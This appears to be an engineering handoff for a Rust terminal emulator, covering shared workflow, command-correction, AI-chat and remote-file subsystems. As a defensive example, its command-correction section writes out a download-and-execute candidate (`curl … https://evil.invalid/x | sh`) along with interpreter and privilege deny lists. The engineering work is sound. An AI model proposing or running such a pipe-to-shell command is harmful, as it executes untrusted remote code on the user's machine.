# Engineering handoff

Updated: 2026-08-30 (an installed workflow library; a fail-closed local/CI
security entry point and the RUSTSEC-2026-0253 dependency repair; the shared
TOML/YAML workflow library and review-first command correction; the shared AI
chat store and its persistence
boundary)

This baseline exact-pins the hardened shared core and jagent revisions and now carries
native bounded OSC 8 interaction, hardened app-owned helper processes, and a tested
prebuilt-artifact install path on top of the Block Mode, Agent review, configuration,
terminal parsing, history, keybindings, and session-persistence work. Block and link
lifecycle identities and cell boundaries are checked, finalized rows own a real gutter,
stale UI targets fail closed, and automatic helper resolution no longer trusts `PATH`.

## Completed since the previous handoff

- **Shared workflow library, and the missing-value guard all four terminals
  implemented and none could reach (2026-08-29)**: `src/workflows.rs` collapses
  from 827 lines to 210 (153 insertions against 770 deletions), and
  `src/workflow_picker.rs` gives up its own fuzzy list and its own value
  bookkeeping (136/116) while keeping every iced widget. The subsystem is now
  `jterm_core::workflows` — five files, 3,186 lines with 73 tests at the pinned
  `790d06ab19b9f3dec7c188728fc468f008df5414` — assembled from the four
  terminals' separately drifted copies (anvil, forge, ember and frost's own).
  Fifteen of frost's twenty-three workflow tests went with the engine they
  covered; nine remain — the eight that are about frost's own wiring, plus one
  new one pinning the picker's query boundary.

  The reason this one was worth converging is not line count. The four apps
  read the *same* library out of the *same* directories, so a difference in
  what one app accepts is a difference in what a user's file **means**
  depending on which terminal opened it. frost was on the right side of the two
  worst divergences already — `O_NOFOLLOW` in the bounded reader (ported from
  forge in the round that introduced this file) and a user-config lookup that
  returns `Option` rather than a CWD-relative path when `HOME` is unset — and
  both are now the family's behaviour rather than this repo's.

  **The defect all four shared.** `render()` is supposed to refuse a declared
  argument that has no default and no value, and frost implemented that guard
  and unit-tested it. It never fired. The parameter form seeded every declared
  argument with `""` before the user saw it (old `workflow_picker.rs:139-144`,
  `arg.default.clone().unwrap_or_default()`),
  so by the time `render()` looked, every argument *had* a value. `kill -9
  {pid}` with an untouched Pid field rendered `kill -9 ` and was typed at the
  prompt for review. The old test
  `args_form_prefills_defaults_and_renders_edits` asserted `deploy api --env=`
  renders fine and called that emptiness intentional — it was the fossil record
  of the defect, not behaviour to preserve, and it is rewritten rather than
  kept.

  The contract is now stated once — *an empty value is meaningful only if the
  file says so, and `default = ""` is how a file says so* — and enforced in two
  places that cannot disagree. `render()` claims the undefaulted, blank-or-
  absent arguments into its missing set *before* building the binding list, so
  a caller that pre-seeds cannot seed past it. `ArgsForm` carries `Unset` vs
  `Supplied` in the type system, so `WorkflowArgsState` no longer holds a
  `Vec<String>` that cannot represent the difference, and
  the shared `ArgsForm::missing` result marks the row `name (required)` in the
  form *before* Insert is pressed. Insert then refuses with `Workflow could not be
  rendered: missing values: pid` on the form's own feedback line. Whitespace-only
  input counts as unfilled. Emptying a *defaulted* field is still a deliberate
  empty value and still renders as one — frost's tested `deploy  --env=staging`
  behaviour survives, and is still asserted.

  Root cause of why one app could never have implemented this at all: forge
  typed `WorkflowArg::default` as `String`, which cannot represent "no
  default". The shared schema uses `Option<String>`, which is what frost's copy
  already had.

  **Three more things a frost user can observe.** A template with an
  unterminated `{{` no longer lets that brace pair claim a later placeholder's
  close: `awk '{{print $1}' {{log}} | sort -u` used to render `awk '{print $1}'
  access.log | sort -u`, a different and executable awk program, while the same
  leading bytes with nothing after them round-tripped unchanged. `{{`/`}}` now
  nest, so a pair's close is its own. A workflow file declaring a padded
  argument name — `name = "pid "`, one invisible keystroke inside a quoted
  string — is rejected at load instead of loading clean, validating clean and
  matching nothing: placeholder names are trimmed, so `kill -9 {{ pid }}` used
  to render the literal `kill -9 { pid }`, the missing-value guard returned
  `Ok` because the argument *had* a value, and whatever the user typed into
  that row was discarded on the way to the prompt. Both halves of a skip log
  line are now sanitised: frost wrote `workflows: skipping {path}: {err}` with
  the path raw and the parser error raw, and `toml::from_str` quotes the
  offending source line back verbatim — a file whose unterminated string is
  `command = "echo <ESC>]0;title<BEL>` put that OSC sequence on a warn line for
  whatever tty was tailing the log.

  **The bundled example that would have hidden the headline fix.**
  `scripts/workflows/docker-tail-logs.yaml` declared `default: ""` for its
  required `container` argument. Under the new contract that is an explicit
  empty value, so the guard would *not* have fired on the example frost ships —
  Insert would have produced `docker logs -f --tail 100 `. The empty default is
  removed and `container` is now a required argument. frost's other five
  bundled files are unchanged, and all six now match anvil's, ember's and
  forge's byte for byte; the reconciliation that got them there landed in
  forge, which is where the copies had drifted.

  **What frost still decides, and why each is injected rather than
  hardcoded.** Four values, because each would silently change behaviour for
  two of the four apps if the core guessed. The XDG backend: frost has no GTK
  dependency and answers with `XdgEnvDirs` (the `dirs` crate plus
  `XDG_DATA_DIRS`), while anvil and forge ask glib, whose fallback chain
  differs. App identity: `SearchPathSpec::for_app("frost", …)` derives both the
  `frost/workflows` segment and the `FROST_WORKFLOW_DIR` override from one
  name, so this app cannot look under its own directory while honouring
  another's variable. `LOAD_ORDER`: frost lists in directory-precedence order
  so `~/.config/frost/workflows/` heads the picker, where ember and forge sort
  the whole library by name — the difference used to be the presence or absence
  of one `sort_by` line, and `LoadOrder` deliberately has no `Default`, so a
  shim that stays silent does not compile. The dev-tree root:
  `env!("CARGO_MANIFEST_DIR")` is expanded against the crate being compiled, so
  evaluating it inside `jterm_core` would point all four apps at
  `jterm_core/scripts/workflows` — a directory that does not exist — while
  every app's bundled-library test kept passing.

  The picker's list state moved too, in the same round rather than the
  follow-up the migration plan expected: `WorkflowPickerState` is now a wrapper
  over `jterm_core::workflows::WorkflowPicker` with
  `PickerPolicy::new(15, false)` — fuzzy, fifteen results, the command template
  *not* searchable. Both halves were previously implicit: forge alone searched
  the template, so `lsof` found its kill-port workflow and nothing else in the
  family found it that way, and forge's list had no cap at all. frost's answers
  are unchanged; they are now stated as a value rather than as the absence of
  code. The three `selected = 0` resets that used
  to live in `main.rs` and the ad-hoc printable-character filter beside them
  are gone; query text crosses `set_query` / `push_query_text` / `backspace`,
  which apply the core's one-line and `MAX_PICKER_QUERY_BYTES` bounds to
  programmatic and accessibility input as well as to typing.

  `serde_yaml_ng` is out of `Cargo.toml`: both halves of the format are now
  deserialised by one serde derive inside the core, and nothing else in frost
  used the crate. `fuzzy-matcher` stays — `history_picker` and
  `command_palette` still use it directly.

- **Shared review-first command correction, and the consent switch this surface
  never read (2026-08-29)**: the four terminals each carried a private copy of
  the "that command failed, here is a fix" flow — anvil 1,817 lines, forge
  2,148, ember 2,335, frost 1,552 — and the engine half of all four imported no
  toolkit code at all. It is now `jterm_core::command_correction` (3,937 lines
  including tests, pinned here at
  `badcce222fb5471a6afbfc5d5e898e2bc3faf632`), and `src/command_correction.rs`
  is a 424-line shim: 229 insertions against 1,357 deletions in that file, plus
  108/87 in `main.rs`. The whole engine moved — the narrow classifier, token
  extraction and ranking, the safety gate, the prompt and its strict-JSON reply
  parser, the supervised probes, both resolvers and every constant. What stayed
  is exactly three things: the policy frost constructs the engine with, the
  per-pane request registry, and the iced card in `main.rs`.

  This surface decides whether a model-proposed command may be *offered for
  execution* next to a pre-filled, auto-focused prompt field, so the divergence
  between the four copies was not a style question. Three of the differences
  were live holes, each present in some copies and absent in others, and frost
  was on the wrong side of two of them.

  **The consent switch.** `ai_share_command_context` is frost's explicit
  authorisation to send command context to a non-local provider, and this is
  the surface that sends the largest payload of any of them: the failed command
  line, the working directory, and up to 8 KiB of captured terminal output.
  frost honours that switch in `ai_chats`, in `ai_command`'s block context and
  in `agent_task_ui`'s Codex gate — and did not consult it here at all. It now
  reaches the engine as `ContextSharing`, built per request because the value is
  live config, and the engine's prompt builder demands a `ConsentProof`, so a
  withheld policy cannot assemble the payload rather than merely declining to
  send it. **The user-visible consequence is the largest in this round: with
  `ai_share_command_context` off — which is the default — the AI fallback goes
  silent.** A user who has `command_correction_enabled = true` and the sharing
  switch off now sees strictly fewer cards, and only ones backed by evidence
  gathered on this machine: the target's own suggested spelling, this host's APT
  index, and this host's executable PATH. Those three resolvers never left the
  machine and keep working unchanged. Turning the sharing switch on restores the
  AI fallback exactly as it behaved before.

  **A candidate could add a pipe into a shell.** The gate compared
  `syntax_markers` as a superset test, and that only asks whether a marker is
  *present*: against an original that already contains a pipe, appending `| sh`
  introduces no new marker, and `sh` is in neither the privilege list
  (`sudo`/`doas`/`su`) nor the remote list (`ssh`/`mosh`/`scp`/`sftp`). So a
  failing `curl -sS https://example.invalid/setup | head -20` could be answered
  with `curl -sS https://evil.invalid/x | sh` and frost would render it in the
  card with the original's own exit code above it. frost had no check at all
  here; forge had one, as four literal spellings, which `|  sh` with two spaces,
  `| /bin/sh`, `| zsh` and `| python3` all walk past. The shared rule splits the
  pipeline quote-aware and compares the *set* of interpreters its stages run, so
  `| xargs sh -c` and `| $SHELL` are refused too, while `ls | gerp foo` →
  `ls | grep foo` is still offered; a core test pins that interpreter set against
  `jagent::safety::is_interpreter` so the two cannot drift apart.

  **Helper trust is the one frost got right**, and it went into the union
  unchanged rather than being merged away. anvil and ember asked
  `owner == euid || mode & 0o022 != 0` and forge asked the same in `host.rs`, so
  a binary owned by a *third* user at mode 0755 answered "not untrusted" to all
  three — and helper resolution reached it by scanning the user's own `PATH`, so
  a hostile `bash` planted earlier on `PATH` on a shared machine was spawned
  automatically by any failed command. Clamping the child's `PATH` never helped,
  because the helper is itself the hostile binary. The same expression inverted
  for root, refusing every system helper when the terminal runs as root and
  silently killing APT-verified corrections in containers. frost resolved
  `bash` and `apt-cache` only from fixed absolute candidates under
  `jterm_core::helper`'s predicate, which answers both halves; that is now
  `HelperStrategy::FixedCandidates`, stated at construction instead of
  inherited. frost pays no new cost for it and gains none: the price of a closed
  candidate list — no APT evidence on a non-FHS host that keeps `apt-cache`
  somewhere else — is the price frost was already paying, and it is the right
  trade for a probe that spawns automatically on any failed command.

  Three legitimate disagreements became construction-time policy with no
  `Default` where safety is involved, following the `BusyChatPolicy` precedent
  from the chat-store round. frost states all three: `LocalEvidence::SameNamespace`
  (frost launches every PTY natively — no Flatpak, no host bridge, no sandbox —
  so this process's `PATH` really is the namespace the failed command resolved
  against, which anvil and forge must not claim), `HelperStrategy::FixedCandidates`
  above, and `ContextSharing` from the live switch. There is no way to omit one
  and still compile: `CorrectionPolicy::new` takes all three positionally,
  `CompletionFacts::trusted_completion` is a required field, `correction_prompt`
  demands the consent witness, and `Original`/`Candidate` newtypes make the
  argument swap — which frost's old `validate_candidate(original, candidate)`
  could only catch by review — uncompilable.

  The card keeps its layout, its two paste policies, its Escape scoping and its
  submission channel, and changes in five ways a user will notice. Its reason
  line is now engine-sanitised and whitespace-collapsed: frost interpolated the
  provider's `message` raw into `text()` directly above the editable, pre-filled,
  auto-focused command field, so a reply carrying U+202E could reverse the
  rendered order of the text beside it; a bidi override now renders as U+FFFD.
  It gained the `⚠ destructive: {reason}` label frost's Agent approval card
  already had, recomputed against the live draft on every keystroke —
  `is_dangerous` never gated whether a candidate is *offered*, only the
  direct-run decision, which is already false for every unverified proposal, so
  a reply proposing `rm -rf ~/work` reached this card in exactly the chrome
  `git status` got. A failed command line longer than 16 KiB is no longer
  classified at all; frost previously classified, ranked, probed and prompted
  about a 200 KiB pasted one-liner on a surface whose own declared budget is
  16 KiB. A verified proposal whose draft differs from the resolver's output
  only by leading or trailing whitespace now runs directly instead of
  downgrading to "Insert for review", because the button's label
  (`run_allowed`) and the accept path (`accept`) now take the run-versus-insert
  decision from the same validated string; they used to disagree, one comparing
  the raw field text and the other the trimmed one. And inline feedback is
  bounded to one line of 200 characters on the way in — frost's own three
  feedback strings were short and app-authored, but this is the card's one
  remaining channel for text the engine did not write, and the obvious shim
  pairing `Err(e) => set_feedback(…{e})` would put a provider-shaped
  `serde_json` error, which echoes its input back verbatim, one line above the
  command field.

  The trigger is now one decision in the engine. `should_start(enabled, facts)`
  owns the toggles, the missing exit status, the output sample and the narrow
  classifier; frost supplies only the two facts it alone knows, as named fields
  rather than positional arguments — `agent_issued` (an Agent-approved command
  already went through review, and correcting it would compete with the Agent's
  own loop) and `trusted_completion` (a boundary-inferred completion attributes
  stale scrollback and a guessed status to a command, so the classifier would
  read "command not found" out of the *previous* command's output). frost's own
  `enabled` gate is still answered first, before the facts are built, purely
  because `CompletionFacts` takes the block output by value and a block holds up
  to `MAX_CAPTURED_OUTPUT_BYTES`; with the feature off, which is the default,
  that would otherwise be an 8 MiB clone per finished `ls`. Pre-sampling instead
  would be wrong, because the engine samples and sampling a sample elides real
  content a second time. One more resolver change is user-visible: the `PATH`
  directory walk that supplies candidate names now ignores relative and empty
  `PATH` entries, so opening a project whose directory sits on a relative `PATH`
  element can no longer contribute its filenames as correction candidates.

  Fifteen of the file's twenty-three tests are gone because the engine they
  covered is gone; the eight that remain are the per-pane registry's four
  (generation replacement, per-pane isolation, exact-generation dismissal,
  deadline expiry), the card's accept-path wiring, and three new ones that pin
  what frost now states: its evidence and helper policy, the consent switch in
  both positions, and the trigger's two frost-supplied refusals. Both policy
  tests were mutation-checked, and the mutations were rerun while writing this:
  flipping `FixedCandidates` to `TrustedPathScan` in `correction_policy` fails
  `frost_states_a_native_namespace_and_fixed_helper_candidates`, and inverting
  the consent mapping fails `the_consent_switch_reaches_the_engine`. The third
  mutation the migration claimed — renaming the probe thread — does **not** turn
  the suite red, and that is worth stating plainly: the assertion is
  `format!("{policy:?}").contains(PROBE_THREAD_NAME)`, so renaming the constant
  renames both sides of the comparison. It does catch the failure that matters
  more (passing some other literal to `CorrectionPolicy::new` fails it), but it
  cannot detect a wrong name, which is the cost of there being no accessor to
  read — see the release-boundary note below.
  Three adversarial audits ran against the shared module before
  any app adopted it and found eight defects in it, including that the merged
  pipe rule was still forge's four-spelling substring match; all eight were
  fixed with regression tests that fail when the fix is reverted.

- **Shared AI chat store, and the quit path that erased the saved library
  (2026-08-29)**: frost's in-progress AI chats panel had grown a private copy of
  the multi-chat state machine over `jterm_core::ai::ConversationSnapshot`, and
  so had anvil, forge and ember. The four copies held no toolkit code and had
  drifted in both directions, so no one of them was correct on its own;
  `jterm_core::ai::chat_store` is now their union (1,888 lines, 47 tests) and
  `src/ai_chat_store.rs` is a 35-line shim carrying the single decision frost
  owns. That decision is `BusyChatPolicy::Refuse`, pinned at both construction
  sites rather than inherited as a default: frost's panel has no
  cancel-then-mutate step — Archive and Delete are single clicks and Stop is a
  separate button — so a chat with a request in flight refuses both, and
  `ai_chats` renders the refusal as "Stop this response before …". Archiving the
  last writable chat at the 50-chat cap is refused before anything mutates, so
  the library always still has a chat to type into.

  The defect this closed is the worst one the round found anywhere in the family,
  and it was here. `Frost::quit` called `self.ai_chats.persist(…)` beside
  `self.agent.persist()` with no guard, and `persist` is a whole-file replace of
  `~/.config/frost/ai_chats.json`. A session in which the panel was never opened
  still held the store's construction-time default — one blank "New chat" — so
  quitting that session overwrote every saved conversation with an empty library.
  Nothing downstream could catch it: the default snapshot is perfectly valid, and
  the write is not a read-modify-write, so there was nothing to conflict with.
  Persistence now fails closed on three independent hazards through
  `can_persist()`: `PersistState::Unloaded` (this run never read the file, so its
  store does not descend from what is on disk), `PersistState::Blocked` (this run
  read it and the read or decode failed — truncated by a crash, past the read
  bound, wrong permissions, a schema version from a future sibling — which is
  recoverable evidence, never something to replace with a fresh empty library),
  and `owns_persistence`, the single-instance lock, because a whole-file write
  from a second window is a last-writer-wins overwrite of whatever the lock
  holder has saved since. A non-owning window still restores and uses the library
  and says so in its notice line rather than silently dropping what is typed into
  it. `persist_never_overwrites_a_library_this_run_did_not_read` drives all three
  cases against a real fixture and asserts the bytes on disk are byte-identical
  afterwards, then proves the owner does republish once it has read the file;
  `a_failed_restore_blocks_every_later_write` drives draft, new-chat, close and
  explicit persist after a failed restore of both a truncated and a
  future-version file.

  The write itself goes through the store's `snapshot_for_persistence`, which
  compacts live history *before* serialising. The two budgets are deliberately
  unequal — the live library is bounded in aggregate at 8 MiB across all chats
  while the persisted schema bounds total turn text at 4 MiB — so `from_chats`
  still compacts on the way out and reports it, and `compact_to_measured_limit`
  then measures the encoded JSON against the 8 MiB envelope cap. Without that
  first pass a long-lived library could reach a size `ConversationSnapshot`
  refuses outright, after which `Err(SnapshotInvalid)` was the only outcome and
  nothing could be saved at all. Retry payloads are materialized into a throwaway
  clone through the core's *detaching* recovery (severing an in-flight request
  costs nothing on a copy that is discarded, and the message survives as a
  draft), so persisting never disturbs the live composer; the truncation markers
  both compaction passes applied are then synced back into the live chats, so a
  library row admits what the saved copy dropped ("· Some local content omitted")
  instead of a conversation quietly shrinking. Writes are debounced on the config
  tick for draft keystrokes but immediate on a finished turn, stop, select,
  new-chat, archive, delete and close. The panel is also an input-owning overlay
  now: while it is open its own chord and Escape close it and every other key is
  swallowed, because keys the panel's focused inputs did not capture — browsing
  the library, or after clicking a chat row — previously reached the hidden shell
  behind it.

- **Pane-bound, review-only AI command suggestion (2026-08-29)**: the inline
  natural-language → command flow (palette entry **Ask AI: Generate Command**, an
  overlay for the request, `src/ai_command.rs` for the card) drafts through
  `jterm_core::ai::nl_to_command_with_context_blocking_cancellable` on a worker
  and inserts only through `review_input::validate` and the guarded
  prompt-replace path. Generated commands never run automatically; the card says
  so verbatim. Two defects in that flow were confirmed and fixed.

  The card was not scoped to the pane that asked for it. "Insert for review"
  resolves its target by `session_id` alone and sends Ctrl+U plus the generated
  command, so a card drafted in one pane and left open while the user moved to
  another still rendered, still owned that pane's Escape, and would clear and
  retype a prompt the user could not see — which is not a review. Rendering,
  Escape ownership and insert now all go through
  `ai_suggestion_bound_session()` / `CommandSuggestion::is_bound_to_active_pane`,
  the same scoping frost's correction card has always had; an off-pane insert is
  refused with a stated reason rather than performed silently. Closing a pane
  drops a card bound to it, and `Drop` cancels the drafting worker.

  The request `generation` was per-card and restarted at 1. An iced `Task`
  returned from `update` cannot be aborted, so a superseded worker always
  delivers, and the generation is the whole of the reply-routing identity that
  `AiSuggestionResolved` carries — two successive cards both numbered 1 meant
  request A's command published onto request B's card, one Enter away from the
  prompt, while B's own reply was then dropped as "not current". The counter is
  now window-wide on `Frost` and strictly increasing via
  `ai_command::next_generation`, which returns `None` on exhaustion (refuse the
  request) rather than wrapping back onto a live id, and `regenerate` refuses any
  id it has already seen. `a_superseded_requests_reply_never_publishes_onto_its_successor`
  pins both halves — the late success and the late cancellation error miss, and
  the live request's own reply still lands.

- **Family contracts and command-history budget drift (2026-08-29)**: the AI chat
  panel's command id is `ai_chat:toggle` — singular, matching the
  `agent:toggle` / `sidebar:toggle` / `debug:toggle` it sits beside — bound by
  default to `ctrl+shift+alt+a` and displayed as `Ctrl+Shift+Alt+A` in
  `jterm_core`'s frozen modifier order, the same id and the same chord in all
  four terminals; a per-app spelling would make one shared keybindings file mean
  different things in different windows. `ai_chats:toggle` is explicitly rejected
  by the parser, and a test derives the palette's hint from the default binding
  through `jterm_core::keybindings::parse(..).display()` so the hint, the table
  and forge's rendering of the same chord cannot drift into three spellings.

  The command-history JSONL index is a family-shared file written by
  `jterm_core::command_history`, and frost's read side had drifted from that
  writer in both constants. `review_text::MAX_HISTORY_COMMAND_BYTES` was a local
  `256 * 1024` — the right number today, but a re-declaration is exactly how the
  siblings ended up four times apart, so it now reads
  `jterm_core::review_input::MAX_REVIEW_INPUT_BYTES` directly. `history_picker`'s
  `MAX_HISTORY_CWD_BYTES` was a genuine defect: 4 KiB against the writer's
  16 KiB, so frost silently dropped the cwd off records that are well-formed in
  the family file. It is now 16 KiB, mirrored with a comment saying why (core's
  `MAX_CWD_BYTES` is private there), and
  `every_record_the_core_writer_accepts_survives_the_picker` builds a record at
  both of the writer's exact bounds and asserts the picker keeps it whole.

- **Remote Files transactional navigation and authority isolation (2026-08-29)**:
  directory root changes now stage a candidate one-level scan and commit only
  its accepted success. Failure, cancellation, and out-of-order completion keep
  the current root, selection, hover, loaded descendants, and expansion state.
  Successful commits feed bounded 32-entry Back/Forward history; the Files
  header adds scoped `Alt+Left`/`Alt+Right`, Parent/Home, bounded breadcrumbs,
  and an absolute-path editor that rejects oversized, relative, dot/parent,
  control, and Bidi input before it has filesystem authority. Up to eight
  departed roots are cached by opaque authority + path + Hidden policy, merged
  only after a fresh successful candidate scan, and exact affected-parent
  snapshots are invalidated after mutations. The global 2/64 coordinator now
  permits one running and at most 16 queued scans per remote authority, so one
  offline host cannot occupy both slots or consume the whole queue; same-path
  merging is authority-aware. Typed transport failures
  use authority cooldown while permission/not-found failures use exact-path
  cooldown, exponentially bounded from 2 to 60 seconds; explicit Retry bypasses
  one cooldown once, and elapsed buckets without queued/running references are
  compacted on later scheduling/completion. Files reports oldest queue wait plus last queue/run time,
  and its existing snapshot tick now low-priority revalidates at most two oldest
  visible/expanded directories after five minutes. Deterministic tests cover
  atomic failure/commit/stale handling, cache/history bounds and invalidation,
  per-authority scheduling, timing, cooldown bypass, TTL, safe paths,
  breadcrumbs, and shortcut scope.

- **Remote Files bounded scans and exact invalidation (2026-08-29)**:
  directory work now passes through one UI-owned coordinator capped at two
  running and 64 queued scans (66 total). Root refreshes and retries are high
  priority, lazy expansion remains fair after a three-request high-priority
  burst, queued same-path work is latest-wins, and queue refusal or a
  `spawn_blocking` join failure produces a normal typed terminal result instead
  of leaving a spinner. Live running/queued counts are shown in Files. Scan
  errors preserve retryability/category while their UI copy is bounded,
  control/Bidi-safe, and redacts backend stderr, host identity, and paths; SSH
  255 is classified as unavailable. Every accepted snapshot records its
  completion instant, shows a rolling age, and is marked stale after five
  minutes; failed refreshes retain the last-good timestamp and content.
  File-operation reports now carry exact affected parents and backend-confirmed
  path remaps. Create/delete/copy/paste/rename therefore refresh loaded or
  collapsed directory caches directly (including after ambiguous failure or
  cancellation), while successful rename/move rewrites selection and anchor by
  path component. Reconciliation prunes only the directory subtree it actually
  replaced, so independently returning source/destination scans cannot erase a
  remapped selection. Files adds cached location Home and Parent navigation,
  scoped `Alt+Home`/`Alt+Up`, and a folder **Open Folder** action; the remote
  home parser requires exactly one absolute UTF-8, control/Bidi-free path.
  Stress, fairness, terminal-state, snapshot-age, exact-refresh/remap,
  sanitization, home parsing, and shortcut-scope tests cover these boundaries.

- **Remote Files retry and cancellation (2026-08-29)**: root and nested
  directory failures now expose an in-place, keyboard-focusable **Retry**.
  Initial-load errors return to a distinct Loading state; failed preserving
  refreshes return to Refreshing while their last-good children, expansion,
  and truncation state remain visible, including across another failure.
  Directory loads carry a same-generation request id plus a cancellation
  token. Issuing newer work for the same path, advancing the tree generation,
  or changing location actively retires queued and running work: a queued job
  checks cancellation before spawning ssh/docker, while an in-flight probe
  reuses the bounded process-group watchdog to kill and reap the full group.
  Results must match both generation and request id, so even a late same-path
  completion is inert and cannot clear hover state. Bare `F5` refreshes only
  while the pointer is inside the visible Files dock; terminal-area F5 keeps
  its normal PTY sequence. State, retry-success/retry-failure, queued/in-flight
  cancellation, stale-hover, and scoped-F5 tests cover these boundaries.

- **Remote Files protocol v4 (2026-08-29)**: `list` now receives the client's
  hidden policy and an exact 4097-entry fetch ceiling, stops emitting at that
  bound, and lets the extra entry prove that the UI's 4096-row snapshot is
  truncated. Truncation travels through directory results/nodes and is shown at
  the affected root or expanded directory. The parser skips invalid UTF-8 and
  non-component names instead of manufacturing a lossy actionable path, and
  deduplicates path collisions. The probe tests symlinks before directories, so
  a symlink-to-directory is a non-expandable file just like the local backend.
  After a preserving refresh reconciles, vanished rows are removed from
  selection/anchor/hover and their menu, dialog, confirmation, drop burst, and
  debounce context is retired; stale worker results remain fully inert. Protocol,
  parser, truncation propagation, symlink, and context-pruning tests cover these
  boundaries.

- **Files preserving remote refresh (2026-08-29)**: same-root rescans now keep
  the last-good rows, loaded descendant trees, and expansion state visible while
  Local or remote work is in flight. Each refresh still advances the generation;
  old descendant loads are retired to reopenable state, stale results are fully
  inert, and a successful root scan reconciles by path and type so surviving
  directories reuse their subtrees. A failed replacement ends the loading state,
  keeps the last-good snapshot, and exposes the error inline. Tests cover
  reconciliation, old-generation descendant retirement, failure preservation,
  retry recovery, and the stale-result hover/drop-target guard.

- **Files hidden-entry policy (2026-08-29)**: the Files header now exposes a
  stateful **Hidden** toggle for both Local and remote listings. The preference
  travels in every immutable directory request; a change clears path selection
  and reloads the root under a new generation without cancelling an unrelated
  file transfer, so a delayed result from the previous policy is inert. Local
  and remote listing apply the preference before their entry caps.

- **Foreground SSH → Files follow (2026-08-27)**: the 1.5 s process heartbeat
  now recognizes a plain interactive SSH command from the active local PTY's
  NUL-delimited `/proc` argv and prefers one uniquely matching saved Files
  profile, otherwise staging a transient location without persisting it as
  config. A shared conservative parser accepts the common
  `ssh user@host -p 22` shape while rejecting remote commands and options that
  could replay local code; terminal output and OSC command text are never
  treated as launch authority. The remote-home probe leaves the current tree
  visible, and its completion must still match the active session, exact live
  SSH profile, tree generation/location/root, and sidebar chrome intent before
  it can reveal Files. Failure keeps the old tree and explains the
  key/agent/control-socket requirement of non-interactive probes. Transient
  identity is carried through picker labels, file operations, clipboard,
  transfers, config reconciliation, and the Remote terminal action; SSH exit
  deliberately does not throw the remote tree away. Provenance-checked jsh
  launchers contribute only a live ControlPath execution overlay (never saved
  identity); same-namespace copy/move prefers that overlay in either direction,
  while a same-target socket upgrade preserves the current root and loaded
  expansion state. The temporary Terminal action opens a plain interactive
  login. A startup race receives
  one bounded automatic retry, followed by an exact-command Retry action in
  Files. The shared core is pinned
  at `1f5f0fbcfd91a084da9216392fe5ab26a5994adc`; all 867 tests and
  warning-denied Clippy pass.

- **Files remote-target safety (2026-08-27)**: the Files header now exposes a
  keyboard-reachable terminal action. Local opens a normal new session at the
  visible tree root; Remote explicitly says **default dir** and reuses the
  selected profile's connection path. Remote-host config replacement no longer
  lets a numeric index silently redirect the tree or an old file clipboard:
  only one exact, complete old-profile identity may rebind across the active
  list. Missing, edited, out-of-range, or duplicate identities fail closed to
  Local, cancel/retire remote transfer state, and clear old selection, menus,
  dialogs, delete confirmation, clipboard, hover/filter state, and drop work.
  Menu-derived create/rename/delete intents additionally carry the tree
  generation and revalidate immediately before dispatch; off-thread drop plans
  and file-op reports carry equivalent stale-result guards. File-op reports
  validate both context epoch and location before clearing even transfer UI,
  so a late cancelled job cannot erase a newer transfer. A unique exact-profile
  index move invalidates old tree intents/drop work and immediately reloads the
  same root with the new index; the old directory result is generation-stale,
  so the panel cannot remain stuck in Loading. Already-dispatched file work
  carries the complete destination profile and can finish against that one
  unique new slot. Copy/Cut replacements have checked monotonic identities, so
  exhaustion fails closed and an old completion can never alias or retire a
  newer Copy/Cut. Backend-confirmed clipboard settlement runs before the
  stale-UI gate: partial/cancelled cuts retire only sources actually moved and
  deleted, while successful Rename/Delete retires matching dangling Copy/Cut
  paths and their descendants. Dispatch also binds the source filesystem, so
  equal path text on Local and a remote profile cannot cross-retire entries. An
  open Paste menu freezes that identity and visibly requires reopening instead
  of substituting a later clipboard. A failed
  remote home probe now returns to a loaded Local root with bounded inline
  feedback,
  so the user can select the profile again instead of being trapped refreshing
  an old path. Pure remap/copy tests cover reorder, full-identity change,
  duplicate ambiguity (including inactive retained duplicates), and
  Local/Remote entry wording; sidebar tests cover generation expiry and
  reindex-load replacement. Validation passed all 861 tests, `cargo check`, and
  warning-denied Clippy across every target.

- **Block Search 4.4 (2026-08-26)**: result-local bookmark controls now carry
  visible action labels (`☆ Bookmark` / `★ Remove`) and honest row-local
  tooltips; the footer alone documents that `Ctrl+Shift+B` acts on the
  highlighted result. Bookmarked zero-result states distinguish an empty
  bookmark set, missing indexed text in the selected scope, and a real query
  miss, including non-empty queries when the selected scope has no bookmarked
  text. The empty-set guidance now gives a reachable path — choose the **All**
  filter and search for a block before adding a bookmark — instead of
  suggesting a shortcut with no selected result. Pure copy/reason tests lock
  these pointer-versus-selection semantics;
  validation passed all 851 tests, all 25 Block Search tests, `cargo check`, and
  warning-denied Clippy across every target.

- **Block Search 4.3 (2026-08-26)**: picker rows now expose in-place `☆`/`★`
  bookmark actions, with exact physical `Ctrl+Shift+B` latched for the full B
  key lifetime so repeats and modifier-release ordering cannot double-toggle or
  leak text into the query. Loading and stale rows remain non-actionable and
  fail closed with picker-local feedback; toggles preserve the closest stable
  selection anchor, synchronize duplicate hits for the same zone, and
  immediately recompute the active Bookmarked view. Empty-query metadata
  browsing now emits only real, meaningful command/output text in the selected
  scope, never synthetic or blank rows. Validation passed the full 849-test
  suite plus 23 targeted Block Search checks.

- **Block Search 3.9 (2026-08-26)**: the picker now exposes a fully labelled
  **Refresh** button with an explanatory tooltip; clicking it and pressing bare
  `F5` share the same bounded rebuild path. The currently configured
  `block:search` chord wins if remapped onto F5; other modified F5 chords remain
  inert under the input-owning overlay. Iced key-repeat events are rejected, so
  one physical F5 press starts at most one refresh; button refresh remains
  repeatable and returns focus to the query. Invalid-query refreshes fail fast
  without hiding their diagnostic or starting a worker, and repeated requests
  while a worker is busy coalesce into at most one follow-up build. If the
  current intent becomes invalid or an unfiltered empty query before the first
  worker lands, its now-useless follow-up is cancelled; real finalized-zone
  version churn still takes priority and rebuilds the latest snapshot. A
  repeated edge from the physical toggle chord that opened the picker is now
  consumed without closing it; a fresh non-repeat chord still closes normally.

- **Block Search 3.3 (2026-08-26)**: Enter and Shift+Enter now close or
  advance only after the selected zone is revalidated and actually revealed.
  A result evicted between paint and activation keeps the picker open, refreshes
  the hit list, and reports the stale target instead of silently stepping.

- **Block Search 3.2 (2026-08-26)**: Home/End and ten-row PageUp/PageDown
  navigation now complement the existing wrapping arrows and position label.
  Every move keeps the selected virtual window visible, and stale out-of-range
  selection state is clamped before navigation rather than producing a bad row.

- **Block Search 3.1 (2026-08-26)**: the picker now exposes `All / Cmd / Out`
  surface scopes with a `Ctrl+O` cycle. Scope is enforced inside the bounded
  matcher before the 500-hit cap, including empty-query metadata browsing, so
  excluded command/output text cannot consume the requested surface's budget.

